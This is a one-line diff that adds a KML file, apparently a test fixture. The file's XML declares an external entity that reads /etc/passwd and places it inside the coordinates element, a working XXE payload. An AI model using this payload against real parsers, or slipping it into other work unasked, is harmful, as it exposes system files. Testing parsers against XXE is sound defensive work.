@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE kml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><kml><Placemark><LineString><coordinates>&xxe;</coordinates></LineString></Placemark></kml>
